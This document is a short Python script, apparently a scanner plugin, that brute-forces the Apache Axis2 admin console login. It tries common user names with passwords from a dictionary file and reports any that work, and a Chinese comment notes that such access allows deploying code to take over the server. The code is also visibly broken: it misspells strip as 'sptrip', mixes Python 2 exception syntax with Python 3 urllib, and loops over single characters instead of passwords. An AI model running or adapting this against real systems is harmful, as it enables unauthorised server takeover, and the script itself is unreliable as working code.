# coding:utf-8
import urllib.request as ur 

#攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。
def check(url, timeout):
    error_i = 0
    flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                 'include page="footer.inc">', 'axis2-admin/logout']
    user_list = ['axis', 'admin', 'root']
    PASSWORD_DIC = open("/password/axis.txt","r").read().sptrip("\n")
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url + '/axis2/axis2-admin/login'
                PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, password)
                request = ur.Request(login_url, PostStr)
                res = ur.urlopen(request, timeout=timeout)
                res_html = res.read()
            except ur.HTTPError, e:
                return
            except ur.URLError, e:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                    return info
